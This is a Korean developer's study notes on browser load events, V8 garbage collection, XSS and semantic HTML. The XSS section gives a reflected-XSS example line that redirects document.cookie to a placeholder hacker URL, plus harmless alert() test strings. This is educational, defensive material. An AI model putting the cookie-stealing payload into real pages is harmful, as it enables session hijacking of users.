# onLoad, DOMContentloaded

## DOMContentloaded

- `document` 객체에서 발생한다.
- 브라우저가 HTML을 전부 읽고 DOM 트리를 완성하는 즉시 발생한다. 이미지 파일이나 스타일 시트 등의 자원이 로드 되는 것은 기다리지 않는다.
- 브라우저 내장 자동완성은 `DOMContentLoaded`에서 일어난다.

### 예외 1. `DOMContentLoaded`와 scripts

> 브라우저는 HTML 문서를 처리하는 도중에 `<script>`태그를 만나면, `<script>`를 실행한 뒤, HTML문서를 처리한다.

👉 `<script>`안의 스크립트가 DOM 조작 관련 로직을 담고 있을 수 있기 때문에 `DOMContentLoaded` 이벤트 역시 `<script>`안의 스크립트가 처리되고 난 후에 발생한다.

**다른 예외**

1. `async` 속성이 있는 스크립트는 `DOMContentLoaded`를 막지 않는다.
2. `'document.createElement('script')`로 동적으로 생성되고 웹페이지에 추가된 스크립트는 `DOMContentLoaded`를 막지 않는다.

### 예외 2. `DOMContentLoaded`와 styles

> 스타일시트를 불러오는 태그 다음에 스크립트가 위치하면 이 스크립트는 스타일 시트가 로드 되기 전까지 실행되지 않는다.(스크립트에서 스타일에 영향을 받는 요소의 프로퍼티를 사용할 가능성이 있기 때문에)

```
<link type="text/css" rel="stylesheet" href="style.css">
<script>
  alert(getComputedStyle(document.body).marginTop);
</script>
```

👉 위와 같은 경우 `DOMContentLoaded`는 `<script>`의 실행을 기다리고 `<script>`는 stylesheet의 로드를 기다리기 때문에 `DOMContentLoaded`는 stylesheet의 로드를 기다리게 된다.

👉 stylesheet밑에 `<script>`가 없다면 `DOMContentLoaded`는 stylesheet의 load를 기다리지 않는다.

[질문(브라우저 내장 자동완성)](https://ko.javascript.info/onload-ondomcontentloaded#ref-1948)
<br><br>

## onload

- `window` 객체에서 발생한다.
- 스타일, 이미지 등의 리소스들이 모두 로드되었을 때 실행된다.

```
<script>
  window.onload = function(){
    //로드 되었을 경우...
  }
</script>
```

위와 같이 모든 리소스들이 로드된 후 실행할 함수를 정의할 수 있다.
<br><br>

## readyState

현재 로딩 상태를 알려주는 프로퍼티이다.

- `loading` - 문서를 불러오는 중일 때
- `interactive` - 문서가 완전히 불러와졌을 때
- `complete` - 문서를 비롯한 이미지 등의 리소스들도 모두 불러와졌을 때
  <br><br>

## test
### 1. script문의 실행 순서
```
<script>
      window.onload = function () {
        console.log('onload in script');
      };
</script>
<script>
      document.addEventListener('DOMContentLoaded', () => {
        console.log('DOMContentLoaded in script');
      });
</script>
<script>
      console.log('in script');
</script>
```
<img src="https://user-images.githubusercontent.com/60134628/158131701-4eb208d6-128b-4071-b82c-a8c962bbd1ee.png" width="400px" height="150px">

1. script문이 `DOMContentLoaded` 전에 실행
2. `DOMContentLoaded` 실행
3. `onload` 실행

### 2. 외부 스크립트 파일
index.js
```
document.addEventListener('DOMContentLoaded', () => {
  console.log('DOMContentLoaded in index.js');
});

window.onload = function () {
  console.log('onload in index.js');
};

console.log('in index.js');
```
1. 외부 script가 index.html의 console이 있는 script보다 아래에 있을 경우
<img src="https://user-images.githubusercontent.com/60134628/158132905-523e1ff5-6072-4065-ae70-2d969ac98745.png" width="400px" height="200px">
👉 index.html안의 스크립트문이 먼저 실행되고 외부 스크립트가 다음으로 실행되는 것을 확인할 수 있다.
<br><br>

2. 외부 script가 index.html의 console이 있는 script보다 위에 있을 경우
<img src="https://user-images.githubusercontent.com/60134628/158133295-8d1d77ae-1426-4e75-be38-9aec2d64ab4c.png" width="400px" height="200px">
👉 외부 스크립트가 먼저 실행되고 index.html안의 스크립트 문이 다음으로 실행되는 것을 확인할 수 있다.
<br><br>

3. 외부 script문에 defer를 속성을 선언할 경우
<img src="https://user-images.githubusercontent.com/60134628/158133539-8c307429-ad65-4073-9ba3-7724e9230e73.png" width="400px" height="200px">
👉 index.html안의 스크립트문이 먼저 실행되고 외부 스크립트가 다음으로 실행되는 것을 확인할 수 있다.
<br><br>

### 결론
- html 문서 처리 중 `<script>` 태그를 만나면 바로 실행되게 된다. 이 실행은 `DOMContentLoaded` 보다 빠르다!
- `<script>` 태그가 `defer` 속성을 가지고 있다면 html문서를 모두 처리한 다음 defer속성을 가진 `<script>` 가 실행된다.
- document에 addEventListener로 `DOMContentLoaded` 시 동작할 함수를 정의하면 함수는 추가되지만 `window.onload`함수는 마지막으로 선언된 함수만 실행되는 것을 알 수 있다.
  <br><br><br>

# major gc, minor gc

## 가비지 콜렉션

> 메모리 할당을 추적하고 할당된 메모리 블록이 더 이상 필요하지 않게 되었는지를 판단하여 회수하는 것

### 참조-세기(Reference-counting) 알고리즘

- "더 이상 필요없는 오브젝트"를 "어떤 다른 오브젝트도 참조하지 않는 오브젝트"라고 정의한다.

한계: 순환 참조를 하고있는 오브젝트는 가비지 컬렉션의 대상으로 보지 않아 메모리 누수의 흔한 원인이 된다.
<br><br>

### 표시하고-쓸기(Mark-and-sweep) 알고리즘

- "더 이상 필요없는 오브젝트"를 "닿을 수 없는 오브젝트"로 정의한다.
- roots라는 오브젝트의 집합을 가지고 있다. roots부터 roots가 참조하는 모든 오브젝트들 roots가 참조하는 오브젝트가 참조하는 오브젝트들...을 닿을 수 있는 오브젝트라고 표시한다.
- 닿을 수 없는 오브젝트에 대해 가비지 콜렉션을 수행한다.

한계: 메모리를 수동으로 해제할 수 없다.
<br><br>

## v8엔진의 힙 메모리

### New영역

- 새로 만들어진 객체를 저장한다. 이 객체는 짧은 생명 주기를 가진다.
- 스캐벤져(Scavenger,**마이너 GC**)가 관리한다.

### Old영역

- 마이너 GC가 두 번 발생할 동안 "New 영역"에서 살아남은 객체들이 이동하는 영역
- 메이저 GC(Mark-sweep 및 Mark-Compact)가 관리한다.
- 다시 두 가지 영역으로 나누어진다.
  - Old 포인터 영역: 살아남은 객체들을 가지며, 이 객체들은 다른 객체를 참조한다.
  - Old 데이터 영역: 데이터만 가진 객체들(다른 객체를 참조하지 않는다.)을 가진다.(예. 문자열, 박싱된 숫자, 실수형으로 언박싱 된 배열)

### 마이너 GC (Scavenger)

- New영역을 작고 깨끗하게 유지시킨다.
- cheney 알고리즘으로 구현되었다.
- 두 개의 영역으로 분리된다.(To영역, From영역)
- 대부분의 할당은 To영역에서 만들어진다.

과정

1. To영역이 가득찰 경우 모든 객체들을 From영역으로 옮긴다.
2. 스택 포인터(GC 루트)부터 From 영역까지 객체 그래프를 재귀적으로 순회하면서 객체들을 찾는다. 찾아진 객체들은 다시 To영역으로 이동한다. From영역에 남아있는 객체들은 가비지로, 마이너 GC가 From 영역을 비운다.
3. 다시 To영역이 가득 찰 경우 위의 1.2.과정이 반복 되고 두 번째 마이너 GC에서 생존한 객체들은 Old영역으로 이동한다.

마이너 GC는 stop-the-world 프로세스지만, 굉장히 빠르고 효율적이다.

### 메이저 GC

- old 영역을 작고 깨끗하게 유지시킨다.
- Mark-Sweep-Compact 알고리즘으로 구현되었다.

과정

- **마킹**: 가비지 컬렉터가 어떤 객체가 사용중인지 식별한다. 사용중이거나, GC루트(스택 포인터)에 재귀적으로 도달할 수 있는 객체들은 활성 상태로 표시한다.
- **스위핑**: 활성 상태로 표시되지 않은 객체들의 메모리 주소를 사용 가능한 목록(free list)에 사용 가능하다고 표시한다.
- **압축**: 활성 상태의 객체들의 조각화를 줄이고 새 객체들에 대한 메모리 할당 성능을 증가시킨다.

메이저 GC 또한 stop the world 프로세스이다. 이를 피하기 위해 V8에서는 다음과 같은 기술을 사용한다.

- **인크리멘탈 GC(Incremental GC)**: GC는 여러 개의 인크리멘탈 단계로 수행된다.(점진적인 단계로)
- **동시 마킹(Concurrent marking)**: 마킹은 자바스크립트 메인 스레드에 영향을 주지 않고 다중 헬프 스레드를 사용해 동시에 수행된다. Write barrier는 헬퍼들이 동시에 마킹하는 동안 자바스크립트가 생성한 객체 간 참조를 추적하는 데 사용된다.
- **동시 스위핑/압축(Concurrent sweeping/compacting)**: 스위핑과 압축은 자바스크립트 메인 스레드에 영향을 주지 않고 헬퍼 스레드에서 동시에 수행된다.
- **레이지 스위핑(Lazy sweeping)**: 레이지 스위핑은 메모리가 필요할 때까지 페이지에서 가비지 삭제를 지연시킨다.
  <br><br><br>

# 크로스 사이트 스크립팅(Cross Site Scripting, XSS)

> 공격자가 상대방의 브라우저에 악성 스크립트를 주입하는 행위

## XSS공격의 목적

- 사용자의 쿠키, 세션 탈취
- 웹 사이트를 변조
- 악의적 콘텐츠 삽입
- 피싱 공격

👉 주 목적은 사용자의 정보를 도용하는 것이다.

## XSS공격이 주로 발생하는 곳

- 대부분의 경우 사용자가 글을 쓰고 읽을 수 있는 게시판
- 사용자의 입력 값을 웹 페이지에 표시하는 곳

## XSS 공격 방식

- 쿠키 스니핑
- 스크립트 암호화 및 우회
- 악성 스크립트 유포
- 키 로거
- 마우스 스니퍼
- 거짓 정보 추가

## XSS 공격 유형

### 반사형 XSS

- 사용자에게 입력 받은 값을 서버에서 되돌려주는 곳에서 발생한다.
- 보통 URL 파라미터에 스크립트를 넣어 서버에 저장하지 않고 즉시 스크립트를 실행하는 방식이다.
- 브라우저 자체에서 차단하는 경우가 많아 상대적으로 공격을 성공시키기 어렵다.

예시) 검색창에 `<script>location.href=<해커url>?value=+document.cookie</script>`를 입력할 경우

### 영구적 XSS(저장형 XSS)

- XSS 취약점으로 악성 스크립트가 삽입되어 DB에 저장된다.
- 악성 스크립트가 존재하는 게시글 등을 열람한 사용자들이 공격을 받는다.
- 악성 스크립트가 DB에 저장되어 지속적으로 공격을 실시하기 때문에 많은 피해가 발생할 수 있다.
- 사용자의 입력값을 검증하지 않기 때문에 발생한다.

예시) javasript: alert(1);

### DOM 기반 XSS

- 서버측에서 탐지가 어렵다.
- 웹사이트의 코드를 조사하지 않고는 취약점을 발견할 수 없다.

### 방어 방법

- 데이터를 입,출력 할 때 모두 필터링
- XSS 방어 라이브러리, 브라우저 확장앱 사용
- 웹 방화벽 사용

### 내 웹사이트는?!

```
li.push(`<li><a href="javascript:alert('XSS')"></a></li>`);
```
<div style="display:flex">
  <img src="https://user-images.githubusercontent.com/60134628/158129642-25a35f4d-a893-435b-85d0-4aecd9787cf4.png" width="400px" height="150px">
  <img src="https://user-images.githubusercontent.com/60134628/158129684-c25cb821-c6ee-4d77-aed6-4d6818f821d8.png" width="400px" height="150px">
</div>
<div style="display:flex">
  <img src="https://user-images.githubusercontent.com/60134628/158130434-d9505a1d-c294-425b-beee-45a8ab574f3e.png" width="400px" height="150px">
  <img src="https://user-images.githubusercontent.com/60134628/158130455-306eb360-c8c8-48bb-8341-5bbd9843a511.png" width="400px" height="150px">
</div>

```
li.push(`<li><script>alert('XSS');</script></li>`);
```

마지막 리스트에 alert창을 띄어주는 a태그가 들어올 경우,script문이 들어올 경우

다음과 같이 html태그에는 보여지지만, 브라우저가 해당 기능을 막아주는 것을 확인할 수 있었다.

브라우저에서 막아준다고 그대로 활용하지말고 다른 방법을 알아보자!
<br><br><br>

# semantic

> 코드 조각의 **의미**를 나타낸다.

self descriptive한 코드들을 의미한다.

### 의미론적인 마크업을 사용할 경우의 이점 [참조](https://developer.mozilla.org/ko/docs/Glossary/Semantics)

- 검색 엔진은 의미론적 마크업 을 페이지의 검색 랭킹에 영향을 줄 수 있는 중요한 키워드로 간주합니다 (SEO)
- 시각 장애가 있는 사용자가 화면 판독기로 페이지를 탐색할 때 의미론적 마크업을 푯말로 사용할 수 있습니다.
- 의미없고 클래스 이름이 붙여져있거나 그렇지 않은 끊임없는 `div` 들을 탐색하는 것보다, 의미있는 코드 블록을 찾는 것이 훨씬 쉽습니다.
- 개발자에게 태그 안에 채워질 데이터 유형을 제안합니다
- 의미있는 이름짓기(Semantic naming)는 적절한 사용자 정의 요소 / 구성 요소의 이름짓기(namimg)를 반영합니다.
  <br><br><br>

# Reference

## XSS

https://ui.toast.com/weekly-pick/ko_20200228
https://namu.wiki/w/XSS
https://noirstar.tistory.com/266

## GC

https://developer.mozilla.org/ko/docs/Web/JavaScript/Memory_Management

## HTML 생명주기

https://ko.javascript.info/onload-ondomcontentloaded

## Semantic

https://developer.mozilla.org/ko/docs/Glossary/Semantics
